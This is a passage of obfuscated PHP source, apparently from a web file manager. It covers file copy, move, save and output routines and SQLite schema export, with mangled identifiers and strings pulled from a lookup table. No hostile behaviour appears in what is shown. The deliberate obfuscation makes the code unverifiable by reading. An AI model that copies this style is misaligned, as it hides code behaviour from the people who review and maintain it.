$Ü¶´­ó[$½¶¯Ûü•[1108]] == $½¶¯Ûü•[1109]) { $“•×€–Ü = $Ü¶´­ó[$½¶¯Ûü•[1110]]; } if (isset($›î ²Ä[$Ü¶´­ó[$½¶¯Ûü•[1108]]])) { $›î ²Ä[$Ü¶´­ó[$½¶¯Ûü•[1108]]][$½¶¯Ûü•[1111]][] = $Ü¶´­ó[$½¶¯Ûü•[1110]]; continue; } $›î ²Ä[$Ü¶´­ó[$½¶¯Ûü•[1108]]] = array($½¶¯Ûü•[1112] => $Ü¶´­ó[$½¶¯Ûü•[1108]], $½¶¯Ûü•[1111] => array($Ü¶´­ó[$½¶¯Ûü•[1110]]), $½¶¯Ûü•[1113] => $Ü¶´­ó[$½¶¯Ûü•[1114]] == $½¶¯Ûü•[88] ? 0 : 1); } $òµö¦şû = array(); foreach ($›î ²Ä as $Ü¶´­ó) { $Çº˜Ú£Ë = $Ü¶´­ó[$½¶¯Ûü•[1112]] == $½¶¯Ûü•[1109]; $š¾Ù“÷§ = array($½¶¯Ûü•[1115], $Ü¶´­ó[$½¶¯Ûü•[1113]] == $½¶¯Ûü•[88] && !$Çº˜Ú£Ë ? $½¶¯Ûü•[1116] : $½¶¯Ûü•[12], $½¶¯Ûü•[1117], $½¶¯Ûü•[1118] . $üšÁÓÈş . $½¶¯Ûü•[11] . ($Çº˜Ú£Ë ? $½¶¯Ûü•[1119] : $Ü¶´­ó[$½¶¯Ûü•[1112]]) . $½¶¯Ûü•[118], $½¶¯Ûü•[1120], $½¶¯Ûü•[118] . $üšÁÓÈş . $½¶¯Ûü•[118], $½¶¯Ûü•[1121] . implode($½¶¯Ûü•[1122], $Ü¶´­ó[$½¶¯Ûü•[1111]]) . $½¶¯Ûü•[1123]); $òµö¦şû[] = implode($½¶¯Ûü•[53], $š¾Ù“÷§) . $½¶¯Ûü•[71]; } $¶Õ®Í†ı = array(); $©ã‡Şßá = array($½¶¯Ûü•[1124] => $½¶¯Ûü•[1125], $½¶¯Ûü•[1125] => $½¶¯Ûü•[1125], $½¶¯Ûü•[288] => $½¶¯Ûü•[315], $½¶¯Ûü•[287] => $½¶¯Ûü•[315]); foreach ($ú¡Ëûò“ as $Ü¶´­ó) { $š¾Ù“÷§ = array($½¶¯Ûü•[118] . $Ü¶´­ó[$½¶¯Ûü•[1126]] . $½¶¯Ûü•[118], isset($©ã‡Şßá[$Ü¶´­ó[$½¶¯Ûü•[1127]]]) ? $©ã‡Şßá[$Ü¶´­ó[$½¶¯Ûü•[1127]]] : $Ü¶´­ó[$½¶¯Ûü•[1128]], $Ü¶´­ó[$½¶¯Ûü•[1129]] == $½¶¯Ûü•[905] ? $½¶¯Ûü•[1130] : $½¶¯Ûü•[1131], $Ü¶´­ó[$½¶¯Ûü•[1126]] == $“•×€–Ü ? $½¶¯Ûü•[1132] : $½¶¯Ûü•[12], $Ü¶´­ó[$½¶¯Ûü•[956]] ? strtoupper(str_replace($½¶¯Ûü•[11], $½¶¯Ûü•[12], $Ü¶´­ó[$½¶¯Ûü•[956]])) : $½¶¯Ûü•[12]); $¶Õ®Í†ı[] = trim(implode($½¶¯Ûü•[53], $š¾Ù“÷§)); } $€ó›ğİ“ = array($½¶¯Ûü•[1133] . $üšÁÓÈş . $½¶¯Ûü•[1134], $½¶¯Ûü•[1135] . $üšÁÓÈş . $½¶¯Ûü•[1136], implode($½¶¯Ûü•[50] . PHP_EOL, $¶Õ®Í†ı), $½¶¯Ûü•[953]); $Ÿ±Æ”Šñ = implode(PHP_EOL, array_merge($€ó›ğİ“, $òµö¦şû)); if ($°½Ë˜Â­ && $°½Ë˜Â­ == $½¶¯Ûü•[13]) { return $Ÿ±Æ”Šñ; } $ÂíàÙç = array($½¶¯Ûü•[808] => $ÏÃ©¸Öê, $½¶¯Ûü•[13] => $Ÿ±Æ”Šñ); return $°½Ë˜Â­ ? $ÂíàÙç[$°½Ë˜Â­] : $ÂíàÙç; } public function sqlFromSqlite($˜òÕï—ú, $ˆ²ÃÇìù = '') { $¯ëÚ¢ªÆ =& $_SERVER[óó‹¸‚å]; $’»‡¦Û = $this->model()->db(); $§š·Åƒ = "\x50\122\x41\x47\115\101\x20\124\x41\x42\x4c\x45\137\x49\x4e\106\117\40\50\47{$˜òÕï—ú}\x27\x29"; $š‹Â”Â = "\x53\105\114\x45\103\x54\40\52\x20\106\122\x4f\115\x20\x73\161\x6c\151\x74\x65\137\x6d\x61\163\164\x65\x72\40\x57\x48\105\122\x45\40\x74\142\154\137\x6e\141\x6d\145\40\x3d\40\x27{$˜òÕï—ú}\47"; $äÆÏŞ·® = $’»‡¦Û->query($§š·Åƒ); if (empty($äÆÏŞ·®)) { $ß¼»äËŸ = array($¯ëÚ¢ªÆ[808] => $¯ëÚ¢ªÆ[12], $¯ëÚ¢ªÆ[13] => $¯ëÚ¢ªÆ[12]); return $ˆ²ÃÇìù ? $ß¼»äËŸ[$ˆ²ÃÇìù] : $ß¼»äËŸ; } $Ï¥ò¦é¼ = $’»‡¦Û->query($š‹Â”Â); $”Œå£Ñæ = $úĞÁ”ò = array(); foreach ($Ï¥ò¦é¼ as $ÖøÛáÍú) { if ($ÖøÛáÍú[$¯ëÚ¢ªÆ[33]] == $¯ëÚ¢ªÆ[279]) { $”Œå£Ñæ[] = $ÖøÛáÍú[$¯ëÚ¢ªÆ[1137]]; } else { $úĞÁ”ò[$ÖøÛáÍú[$¯ëÚ¢ªÆ[32]]] = $ÖøÛáÍú[$¯ëÚ¢ªÆ[1137]]; } } $³×µ•°Ã = array_merge(array($¯ëÚ¢ªÆ[1133] . $˜òÕï—ú . $¯ëÚ¢ªÆ[118]), $”Œå£Ñæ, array_values($úĞÁ”ò)); $³×µ•°Ã = implode($¯ëÚ¢ªÆ[71] . PHP_EOL, $³×µ•°Ã) . $¯ëÚ¢ªÆ[71]; if ($ˆ²ÃÇìù && $ˆ²ÃÇìù == $¯ëÚ¢ªÆ[13]) { return $³×µ•°Ã; } $‚¯ÙªŞà = array(); $Â÷Á™™ = array($¯ëÚ¢ªÆ[1125] => $¯ëÚ¢ªÆ[1138], $¯ëÚ¢ªÆ[315] => $¯ëÚ¢ªÆ[1139]); $‹óß—Ÿı = $¯ëÚ¢ªÆ[12]; foreach ($äÆÏŞ·® as $ÖøÛáÍú) { if ($ÖøÛáÍú[$¯ëÚ¢ªÆ[57]] == $¯ëÚ¢ªÆ[88]) { $‹óß—Ÿı = $ÖøÛáÍú[$¯ëÚ¢ªÆ[32]]; } $ø«©×½ = array($¯ëÚ¢ªÆ[385] . $ÖøÛáÍú[$¯ëÚ¢ªÆ[32]] . $¯ëÚ¢ªÆ[385], isset($Â÷Á™™[$ÖøÛáÍú[$¯ëÚ¢ªÆ[33]]]) ? $Â÷Á™™[$ÖøÛáÍú[$¯ëÚ¢ªÆ[33]]] : $ÖøÛáÍú[$¯ëÚ¢ªÆ[33]], $ÖøÛáÍú[$¯ëÚ¢ªÆ[35]] == $¯ëÚ¢ªÆ[88] ? $¯ëÚ¢ªÆ[1130] : $¯ëÚ¢ªÆ[1140] . $ÖøÛáÍú[$¯ëÚ¢ªÆ[56]], $ÖøÛáÍú[$¯ëÚ¢ªÆ[57]] == $¯ëÚ¢ªÆ[88] ? $¯ëÚ¢ªÆ[1141] : $¯ëÚ¢ªÆ[12]); $‚¯ÙªŞà[] = trim(implode($¯ëÚ¢ªÆ[53], $ø«©×½)); } foreach ($úĞÁ”ò as $º¨ŸÓŒ½ => $óğê„Çô) { $ô¸ñ²ï¼ = str_replace($¯ëÚ¢ªÆ[1142] . $˜òÕï—ú . $¯ëÚ¢ªÆ[11], $¯ëÚ¢ªÆ[12], $º¨ŸÓŒ½); $†©³°æŒ = str_replace(array($¯ëÚ¢ªÆ[118], $¯ëÚ¢ªÆ[964]), $¯ëÚ¢ªÆ[385], substr($óğê„Çô, stripos($óğê„Çô, $¯ëÚ¢ªÆ[260]))); if ($ô¸ñ²ï¼ == $¯ëÚ¢ªÆ[1119]) { $£ó–¦¿Š = $¯ëÚ¢ªÆ[1143] . $‹óß—Ÿı . $¯ëÚ¢ªÆ[1144]; } else { $£ó–¦¿Š = (stripos($ô¸ñ²ï¼, $¯ëÚ¢ªÆ[11]) ? $¯ëÚ¢ªÆ[1145] : $¯ëÚ¢ªÆ[12]) . ($¯ëÚ¢ªÆ[1146] . $ô¸ñ²ï¼ . $¯ëÚ¢ªÆ[1147] . $†©³°æŒ); } $‚¯ÙªŞà[] = $£ó–¦¿Š; } $ƒòË°ì† = array($¯ëÚ¢ªÆ[1148] . $˜òÕï—ú . $¯ëÚ¢ªÆ[1149], $¯ëÚ¢ªÆ[1150] . $˜òÕï—ú . $¯ëÚ¢ªÆ[1151], implode($¯ëÚ¢ªÆ[50] . PHP_EOL, $‚¯ÙªŞà), $¯ëÚ¢ªÆ[1152]); $´à²Ğ˜¶ = implode(PHP_EOL, $ƒòË°ì†); if ($ˆ²ÃÇìù && $ˆ²ÃÇìù == $¯ëÚ¢ªÆ[808]) { return $´à²Ğ˜¶; } $ß¼»äËŸ = array($¯ëÚ¢ªÆ[808] => $´à²Ğ˜¶, $¯ëÚ¢ªÆ[13] => $³×µ•°Ã); return $ˆ²ÃÇìù ? $ß¼»äËŸ[$ˆ²ÃÇìù] : $ß¼»äËŸ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($¯Ù›Ä, $ÊÍâªØ) { $ó‚„è“ =& $_SERVER[óó‹¸‚å]; $å Şõãç = $ÊÍâªØ; $GLOBALS[$ó‚„è“[1153]] = $ó‚„è“[1154] . $¯Ù›Ä; Hook::trigger($ó‚„è“[1154] . $¯Ù›Ä . $ó‚„è“[1155], $å Şõãç); $ùÏ¸ÃÙ± = self::driverMake($ÊÍâªØ[0]); if (!$ùÏ¸ÃÙ±) { return !1; } if (method_exists($ùÏ¸ÃÙ±, $¯Ù›Ä)) { $Ü±úúôı = @call_user_func_array(array($ùÏ¸ÃÙ±, $¯Ù›Ä), $ÊÍâªØ); } else { if (method_exists($ùÏ¸ÃÙ±, $ó‚„è“[1156])) { $Ü±úúôı = @call_user_func_array(array($ùÏ¸ÃÙ±, $¯Ù›Ä), $ÊÍâªØ); } else { if (method_exists(self, $¯Ù›Ä)) { $Ü±úúôı = @call_user_func_array(array(self, $¯Ù›Ä), $ÊÍâªØ); } else { $Ü±úúôı = call_user_func_array(array(parent, $¯Ù›Ä), $ÊÍâªØ); } } } Hook::trigger($ó‚„è“[1154] . $¯Ù›Ä . $ó‚„è“[1157], $å Şõãç, $Ü±úúôı); return $Ü±úúôı; } public static function init($•îï„ŒÄ) { return self::driverMake($•îï„ŒÄ); } public static function copy($Ò¤ŞİÆ€, $§™¿€Õ¯, $öé¬ƒ = false, $ĞâèêŒó = false) { return self::copyMoveStart($Ò¤ŞİÆ€, $§™¿€Õ¯, $öé¬ƒ, $_SERVER[óó‹¸‚å][555], $ĞâèêŒó); } public static function move($½¡ä•¿¿, $’òÎÙ¯ñ, $ôó­ÜÔá = false, $ö ÒˆÎ = false) { return self::copyMoveStart($½¡ä•¿¿, $’òÎÙ¯ñ, $ôó­ÜÔá, $_SERVER[óó‹¸‚å][557], $ö ÒˆÎ); } private static function copyMoveStart($…Îî¡şú, $¼ƒäéù­, $¼†ç²óó, $çª¯­, $Öü·îâé) { $â±­‚÷” =& $_SERVER[óó‹¸‚å]; $±¹Õ™Ìš = array($…Îî¡şú, $¼ƒäéù­, $¼†ç²óó, $Öü·îâé); Hook::trigger($â±­‚÷”[1154] . $çª¯­ . $â±­‚÷”[1155], $±¹Õ™Ìš); $®œ€ú¥« = self::copyMove($…Îî¡şú, $¼ƒäéù­, $¼†ç²óó, $çª¯­, $Öü·îâé); Hook::trigger($â±­‚÷”[1154] . $çª¯­ . $â±­‚÷”[1157], $±¹Õ™Ìš, $®œ€ú¥«); return $®œ€ú¥«; } public static function saveFile($ë‰ààÏ’, $Šìğšˆê, $İö‘…ã = true) { $šÍüûŒß =& $_SERVER[óó‹¸‚å]; $Šô¼ÓœÊ = self::info($Šìğšˆê); $´¢½òØ¬ = self::driverMake($ë‰ààÏ’); $µÎ£Ğí· = self::driverMake($Šìğšˆê); $Õ‘€›“è = !1; if ($µÎ£Ğí·->pathParse[$šÍüûŒß[1158]]) { $Õ‘€›“è = $µÎ£Ğí·; $ôó“‘Ÿ” = $µÎ£Ğí·->pathParse[$šÍüûŒß[1158]]; $µÎ£Ğí· = self::driverMake($ôó“‘Ÿ”); } if ($´¢½òØ¬->pathParse[$šÍüûŒß[1158]]) { $ìïœïõ = $´¢½òØ¬->pathParse[$šÍüûŒß[1158]]; $´¢½òØ¬ = self::driverMake($ìïœïõ); } $¨ã¡º“€ = $µÎ£Ğí·->pathFather($Šìğšˆê); $ë»òŞ© = !0; if (!$İö‘…ã && self::driverIsSame($´¢½òØ¬, $µÎ£Ğí·)) { $ë»òŞ© = !1; } $’©Ê¦½ = self::copyFile($´¢½òØ¬, $ë‰ààÏ’, $µÎ£Ğí·, $¨ã¡º“€, $Šô¼ÓœÊ[$šÍüûŒß[32]], $ë»òŞ©); if ($Õ‘€›“è) { $’©Ê¦½ = $Õ‘€›“è->getPathOuter($’©Ê¦½); } return $’©Ê¦½; } private static function copyMove($­±Æô‰¹, $á˜ôÆëÍ, $œˆ¿‘Öš, $Ş¥¦ñ¼, $Ò¶ùñš = false) { $Ì¿Ê‘Ÿû =& $_SERVER[óó‹¸‚å]; if (!$­±Æô‰¹ || $­±Æô‰¹ == $Ì¿Ê‘Ÿû[8] || !$á˜ôÆëÍ) { return !1; } ignore_timeout(); $„³û¤Õë = self::driverMake($­±Æô‰¹); $½„¶µ•¸ = self::driverMake($á˜ôÆëÍ); $äÍ¡¡•˜ = $Ş¥¦ñ¼ == $Ì¿Ê‘Ÿû[557]; $á’Ö–› = !1; if ($½„¶µ•¸->pathParse[$Ì¿Ê‘Ÿû[1158]]) { $á’Ö–› = $½„¶µ•¸; $á˜ôÆëÍ = $½„¶µ•¸->pathParse[$Ì¿Ê‘Ÿû[1158]]; $½„¶µ•¸ = self::driverMake($á˜ôÆëÍ); } if ($„³û¤Õë->pathParse[$Ì¿Ê‘Ÿû[1158]]) { $­±Æô‰¹ = $„³û¤Õë->pathParse[$Ì¿Ê‘Ÿû[1158]]; $„³û¤Õë = self::driverMake($­±Æô‰¹); } self::check($„³û¤Õë, $­±Æô‰¹, $½„¶µ•¸, $á˜ôÆëÍ); Hook::trigger($Ì¿Ê‘Ÿû[1159], $„³û¤Õë, $­±Æô‰¹, $½„¶µ•¸, $á˜ôÆëÍ); $æï¾Éù = self::driverIsSame($„³û¤Õë, $½„¶µ•¸); if ($æï¾Éù) { if ($Ş¥¦ñ¼ == $Ì¿Ê‘Ÿû[557] && !method_exists($½„¶µ•¸, $Ì¿Ê‘Ÿû[1160]) && trim($á˜ôÆëÍ, $Ì¿Ê‘Ÿû[8]) == trim($½„¶µ•¸->pathFather($­±Æô‰¹), $Ì¿Ê‘Ÿû[8])) { if ($„³û¤Õë->pathThis($­±Æô‰¹) != $Ò¶ùñš && !$„³û¤Õë->isTypeObject()) { return $„³û¤Õë->rename($­±Æô‰¹, $Ò¶ùñš); } return $½„¶µ•¸->getPathOuter($­±Æô‰¹); } if (method_exists($½„¶µ•¸, $Ş¥¦ñ¼)) { return $½„¶µ•¸->{$Ş¥¦ñ¼}($­±Æô‰¹, $á˜ôÆëÍ, $œˆ¿‘Öš, $Ò¶ùñš); } } if ($æï¾Éù && $Ş¥¦ñ¼ == $Ì¿Ê‘Ÿû[557] && $½„¶µ•¸->getType() == $Ì¿Ê‘Ÿû[106]) { $ªâ±•¡ö = $½„¶µ•¸->movePath($­±Æô‰¹, $á˜ôÆëÍ, $Ò¶ùñš); if ($ªâ±•¡ö) { return $ªâ±•¡ö; } } $Ô°ÃÑ¥ñ = $„³û¤Õë->isFile($­±Æô‰¹); if (!$Ô°ÃÑ¥ñ && $½„¶µ•¸->getType() == $Ì¿Ê‘Ÿû[762] && $„³û¤Õë->getType() == $Ì¿Ê‘Ÿû[106]) { $ªâ±•¡ö = $½„¶µ•¸->copyFolderFromIO($„³û¤Õë, $­±Æô‰¹, $á˜ôÆëÍ, $œˆ¿‘Öš, $äÍ¡¡•˜, $Ò¶ùñš); } else { $ªâ±•¡ö = self::copyPath($„³û¤Õë, $­±Æô‰¹, $½„¶µ•¸, $á˜ôÆëÍ, $œˆ¿‘Öš, $äÍ¡¡•˜, $Ô°ÃÑ¥ñ, $Ò¶ùñš); } if ($ªâ±•¡ö && $äÍ¡¡•˜) { $„³û¤Õë->remove($­±Æô‰¹); } if ($á’Ö–›) { $ªâ±•¡ö = $á’Ö–›->getPathOuter($ªâ±•¡ö); } return $ªâ±•¡ö; } private static function check($ıãåÔıí, $òöİ›¨, $×º¿œİö, &$üîÎ¾ª÷) { $Ü…üËí¨ =& $_SERVER[óó‹¸‚å]; if (self::driverIsSame($ıãåÔıí, $×º¿œİö) && $ıãåÔıí->isFolder($òöİ›¨) && $ıãåÔıí->isParentOf($òöİ›¨, $üîÎ¾ª÷)) { show_json(LNG($Ü…üËí¨[1161]), !1); } if (!$ıãåÔıí->exist($òöİ›¨)) { show_json(LNG($Ü…üËí¨[105]), !1); } } private static function copyPath($è×¤Èü¨, $éÆ¹¬²ê, $Ú¢î–Ï, $ùí¸ìÆ”, $İæ·¾¤ş, $×£¦ÔşÈ, $“ó¬ÇÒñ, $§œ“ò•ô = false, $á¶§ğŠÍ = true) { $º©„Øö© =& $_SERVER[óó‹¸‚å]; $Ş˜ÊÅ€˜ = empty($§œ“ò•ô) && $§œ“ò•ô !== $º©„Øö©[197] ? $è×¤Èü¨->pathThis($éÆ¹¬²ê) : $§œ“ò•ô; if ($İæ·¾¤ş) { $“èÌŠ²õ = $Ú¢î–Ï->fileNameExist($ùí¸ìÆ”, $Ş˜ÊÅ€˜); $£¶Îªí© = $Ş˜ÊÅ€˜; $Ş˜ÊÅ€˜ = $Ú¢î–Ï->fileNameAuto($ùí¸ìÆ”, $Ş˜ÊÅ€˜, $İæ·¾¤ş, !$“ó¬ÇÒñ); if (!$“èÌŠ²õ || $£¶Îªí© != $Ş˜ÊÅ€˜) { $İæ·¾¤ş = !1; } if ($á¶§ğŠÍ && !$İæ·¾¤ş) { $Ú¢î–Ï->_data[$º©„Øö©[1162]] = !0; } } if ($“ó¬ÇÒñ) { return self::copyFile($è×¤Èü¨, $éÆ¹¬²ê, $Ú¢î–Ï, $ùí¸ìÆ”, $Ş˜ÊÅ€˜, $×£¦ÔşÈ); } if ($İæ·¾¤ş == REPEAT_RENAME_FOLDER) { $İæ·¾¤ş = !1; } $Ğ«‰ô÷Ü = rtrim($ùí¸ìÆ”, $º©„Øö©[8]) . $º©„Øö©[8] . $Ş˜ÊÅ€˜; $»±ÖñÏ = $Ú¢î–Ï->mkdir($Ú¢î–Ï->getPath($Ğ«‰ô÷Ü), $İæ·¾¤ş); $ùí¸ìÆ” = $Ú¢î–Ï->getPathInner($»±ÖñÏ); $îÈúË¶‡ = $è×¤Èü¨->listPath($éÆ¹¬²ê, !0); $îÈúË¶‡ = is_array($îÈúË¶‡) ? $îÈúË¶‡ : array($º©„Øö©[83] => array(), $º©„Øö©[82] => array()); $ÕÇ³ì¨± = array_merge($îÈúË¶‡[$º©„Øö©[83]], $îÈúË¶‡[$º©„Øö©[82]]); foreach ($ÕÇ³ì¨± as $€¹ãášî) { $ÀÖ‘¯ø™ = $€¹ãášî[$º©„Øö©[33]] == $º©„Øö©[199]; $éÆ¹¬²ê = $è×¤Èü¨->getPathInner($€¹ãášî[$º©„Øö©[84]]); $ùôñ§å× = self::copyPath($è×¤Èü¨, $éÆ¹¬²ê, $Ú¢î–Ï, $ùí¸ìÆ”, $İæ·¾¤ş, $×£¦ÔşÈ, $ÀÖ‘¯ø™, !1, !1); if (!$ùôñ§å×) { IO::errorTips($º©„Øö©[1163] . $éÆ¹¬²ê . $º©„Øö©[70] . $ùí¸ìÆ”); } } self::copyMoveKeepInfo($è×¤Èü¨, $éÆ¹¬²ê, $»±ÖñÏ); return $»±ÖñÏ; } private static function copyFile($şõ©„«ª, $àœî‰ßÛ, $‡ÇÒâä¸, $šöÁ›², $¬‚…«Ú£, $Îğò©»„) { $ˆß¹’èå =& $_SERVER[óó‹¸‚å]; $šöÁ›² = $‡ÇÒâä¸->getPath(rtrim($šöÁ›², $ˆß¹’èå[8]) . $ˆß¹’èå[8] . $¬‚…«Ú£); $Ñ¸å½“¥ = $ˆß¹’èå[1164] . time() . rand_string(5); Hook::trigger($ˆß¹’èå[1165], $şõ©„«ª, $àœî‰ßÛ, $‡ÇÒâä¸, $šöÁ›², $¬‚…«Ú£, $Ñ¸å½“¥); if (self::driverIsSame($şõ©„«ª, $‡ÇÒâä¸)) { if ($Îğò©»„) { $çÏæ–Ä = $‡ÇÒâä¸->moveFile($àœî‰ßÛ, $šöÁ›²); } else { $çÏæ–Ä = $‡ÇÒâä¸->copyFile($àœî‰ßÛ, $šöÁ›²); } Hook::trigger($ˆß¹’èå[1166], $şõ©„«ª, $àœî‰ßÛ, $‡ÇÒâä¸, $šöÁ›², $¬‚…«Ú£, $çÏæ–Ä); self::copyMoveKeepInfo($şõ©„«ª, $àœî‰ßÛ, $çÏæ–Ä); return $çÏæ–Ä; } $™­©øâ‰ = TEMP_FILES; if ($GLOBALS[$ˆß¹’èå[6]][$ˆß¹’èå[89]][$ˆß¹’èå[800]]) { $™­©øâ‰ = $GLOBALS[$ˆß¹’èå[6]][$ˆß¹’èå[89]][$ˆß¹’èå[800]]; } $÷Ï×Õ™² = $™­©øâ‰; mk_dir($÷Ï×Õ™²); $×ÆÅŞ›ğ = $÷Ï×Õ™² . $Ñ¸å½“¥; $·•Ûõ–î = $×ÆÅŞ›ğ; $×ÆÅŞ›ğ = $şõ©„«ª->download($àœî‰ßÛ, $×ÆÅŞ›ğ); $×ÆÅŞ›ğ = $şõ©„«ª->iconvApp($×ÆÅŞ›ğ); if (substr($×ÆÅŞ›ğ, strlen($™­©øâ‰)) == $™­©øâ‰) { $Îğò©»„ = !0; } $çÏæ–Ä = $‡ÇÒâä¸->upload($šöÁ›², $×ÆÅŞ›ğ, $Îğò©»„); self::remove($·•Ûõ–î); Hook::trigger($ˆß¹’èå[1166], $şõ©„«ª, $àœî‰ßÛ, $‡ÇÒâä¸, $šöÁ›², $¬‚…«Ú£, $çÏæ–Ä); self::copyMoveKeepInfo($şõ©„«ª, $àœî‰ßÛ, $çÏæ–Ä); return $çÏæ–Ä; } private static function copyMoveKeepInfo($’‘åÖÖš, $ˆµ¼æŸ­, $»æÈ¾©) { if (!$»æÈ¾©) { return; } $ì·ØœÙ = $’‘åÖÖš->info($ˆµ¼æŸ­); if (!is_array($ì·ØœÙ)) { return; } IO::setModifyTime($»æÈ¾©, $ì·ØœÙ[$_SERVER[óó‹¸‚å][85]]); } public static function pathFather($½¤¬§ã) { $ªˆì‘æË = IO::init($½¤¬§ã); $ñÄéÒ˜ = $ªˆì‘æË->pathFather($ªˆì‘æË->path); return $ªˆì‘æË->getPathOuter($ñÄéÒ˜); } public static function fileOut($è÷Á£±‰, $—´Ø¬Ã = false, $ô«¹Á³• = false, $Š–Ğ­Ú = '') { $•ã¥àú€ = self::driverMake($è÷Á£±‰); if ($•ã¥àú€->isFileOutServer()) { return $•ã¥àú€->fileOutServer($è÷Á£±‰, $—´Ø¬Ã, $ô«¹Á³•, $Š–Ğ­Ú); } return $•ã¥àú€->fileOut($è÷Á£±‰, $—´Ø¬Ã, $ô«¹Á³•, $Š–Ğ­Ú); } public static function fileOutImage($˜ñ¬±Ãâ, $ õä¸Û¿ = 250) { $ÓÖÑÌÎ = array(250, 600, 1200, 2000, 3000, 5000); for ($…§°æ‚å = 0; $…§°æ‚å < count($ÓÖÑÌÎ); $…§°æ‚å++) { if ($…§°æ‚å == 0 && $ õä¸Û¿ <= $ÓÖÑÌÎ[$…§°æ‚å]) { $ õä¸Û¿ = $ÓÖÑÌÎ[$…§°æ‚å]; break; } else { if ($ õä¸Û¿ > $ÓÖÑÌÎ[$…§°æ‚å - 1] && $ õä¸Û¿ <= $ÓÖÑÌÎ[$…§°æ‚å]) { $ õä¸Û¿ = $ÓÖÑÌÎ[$…§°æ‚å]; break; } else { if ($…§°æ‚å == count($ÓÖÑÌÎ) - 1 && $ õä¸Û¿ > $ÓÖÑÌÎ[$…§°æ‚å]) { $ õä¸Û¿ = $ÓÖÑÌÎ[$…§°æ‚å]; break; } } } } $£İæÖ°æ = self::driverMake($˜ñ¬±Ãâ); if ($£İæÖ°æ->isFileOutServer()) { return $£İæÖ°æ->fileOutImageServer($˜ñ¬±Ãâ, $ õä¸Û¿); } return $£İæÖ°æ->fileOutImage($˜ñ¬±Ãâ, $ õä¸Û¿); } private static function driverIsSame($“¯Öƒ´¹, $Õ¦ŠÈ‘) { $ôı‚Æï¯ =& $_SERVER[óó‹¸‚å]; $ì‹Ñ°² = $“¯Öƒ´¹->getType(); $¼‹ÃÊË§ = $Õ¦ŠÈ‘->getType(); if ($ì‹Ñ°² != $¼‹ÃÊË§) { return !1; } if ($ì‹Ñ°² == $ôı‚Æï¯[762]) { return !0; } if ($ì‹Ñ°² == $ôı‚Æï¯[106]) { return !0; } if ($“¯Öƒ´¹->pathDriver == $Õ¦ŠÈ‘->pathDriver) { return !0; } return !1; } public static function copyUpdate($ÔÄîç®å, $ûŸè½€) { $Œô“úŠÆ =& $_SERVER[óó‹¸‚å]; if (!IO::exist($ÔÄîç®å)) { return !1; } if (!IO::exist($ûŸè½€)) { IO::mkdir($ûŸè½€); } $¥ßÒï© = self::_listAll($ÔÄîç®å); $á£ûï˜ = self::_listAll($ûŸè½€); $ç—İµ‹ = array(); $úªËüß– = array(); foreach ($¥ßÒï© as $Ö¦ÁÏŞ => $ØÍ€û) { if (isset($á£ûï˜[$Ö¦ÁÏŞ])) { if ($ØÍ€û[$Œô“úŠÆ[75]] == 1) { continue; } if ($á£ûï˜[$Ö¦ÁÏŞ][$Œô“úŠÆ[76]] == $ØÍ€û[$Œô“úŠÆ[76]]) { continue; } } if ($ØÍ€û[$Œô“úŠÆ[75]] == 1) { $úªËüß–[] = $ûŸè½€ . $Œô“úŠÆ[8] . $Ö¦ÁÏŞ; continue; } $îĞ¡ìäš = strstr(trim($Ö¦ÁÏŞ, $Œô“úŠÆ[8]), $Œô“úŠÆ[8]) ? get_path_father($Ö¦ÁÏŞ) : $Œô“úŠÆ[12]; $ç—İµ‹[] = array($Œô“úŠÆ[1167] => $ØÍ€û[$Œô“úŠÆ[84]], $Œô“úŠÆ[1168] => rtrim($ûŸè½€, $Œô“úŠÆ[8]) . $Œô“úŠÆ[8] . $îĞ¡ìäš, $Œô“úŠÆ[1169] => $ØÍ€û); } $—üÜÇÂÄ = array($Œô“úŠÆ[199] => $ç—İµ‹, $Œô“úŠÆ[75] => $úªËüß–); Hook::trigger($Œô“úŠÆ[1170], $ÔÄîç®å, $ûŸè½€, $—üÜÇÂÄ); foreach ($úªËüß– as $ØÍ€û) { IO::mkdir($ØÍ€û); } foreach ($ç—İµ‹ as $ØÍ€û) { IO::copy($ØÍ€û[$Œô“úŠÆ[1167]], $ØÍ€û[$Œô“úŠÆ[1168]], REPEAT_REPLACE); } } private static function _listAll($ãº€ÚëÉ) { $ÂĞÁôÖì =& $_SERVER[óó‹¸‚å]; $ãº€ÚëÉ = KodIO::clear($ãº€ÚëÉ); $ÙĞÒ×ìË = IO::listAll($ãº€ÚëÉ); foreach ($ÙĞÒ×ìË as &$Ø˜Ãº¦ö) { $ªÌ˜ˆ¿ = substr($Ø˜Ãº¦ö[$ÂĞÁôÖì[84]], strlen($ãº€ÚëÉ)); $Ø˜Ãº¦ö[$ÂĞÁôÖì[1171]] = trim($ªÌ˜ˆ¿, $ÂĞÁôÖì[8]); } unset($Ø˜Ãº¦ö); return array_to_keyvalue($ÙĞÒ×ìË, $ÂĞÁôÖì[1171]); } public static function fileSubstr($Ô¿Î™º¡, $ôØŒ‡÷¬, $ã™™Æ = false) { $ã«Îã§ª =& $_SERVER[óó‹¸‚å]; $ªîş‰¼ = self::driverMake($Ô¿Î™º¡); $ÁõÔëˆØ = $ªîş‰¼->size($Ô¿Î™º¡); $‚ÔĞàõı = $ôØŒ‡÷¬; $÷°µ€ÏŞ = $ã™™Æ; if ($ôØŒ‡÷¬ < 0) { $ôØŒ‡÷¬ = $ÁõÔëˆØ + $ôØŒ‡÷¬; } if ($ã™™Æ === !1) { $ã™™Æ = $ÁõÔëˆØ - $ôØŒ‡÷¬; } if ($ôØŒ‡÷¬ + $ã™™Æ > $ÁõÔëˆØ) { $ã™™Æ = $ÁõÔëˆØ - $ôØŒ‡÷¬; } if (!$ÁõÔëˆØ && $ªîş‰¼->getType() == $ã«Îã§ª[106] && !$ªîş‰¼->exist($Ô¿Î™º¡)) { $ø±ÓşÈÔ = get_path_this($Ô¿Î™º¡); $¿è®»¡Ä = parse_url_query($ø±ÓşÈÔ); if (is_array($¿è®»¡Ä) && isset($¿è®»¡Ä[$ã«Îã§ª[32]])) { $ø±ÓşÈÔ = urldecode($¿è®»¡Ä[$ã«Îã§ª[32]]); } throw new Exception($ã«Îã§ª[1172] . LNG($ã«Îã§ª[1173]) . $ã«Îã§ª[973] . clear_html($ø±ÓşÈÔ) . $ã«Îã§ª[12]); } if ($ã™™Æ <= 0) { return $ã«Îã§ª[12]; } if ($ôØŒ‡÷¬ < 0 || $ôØŒ‡÷¬ >= $ÁõÔëˆØ || $ã™™Æ > 1024 * 1024 * 10) { throw new 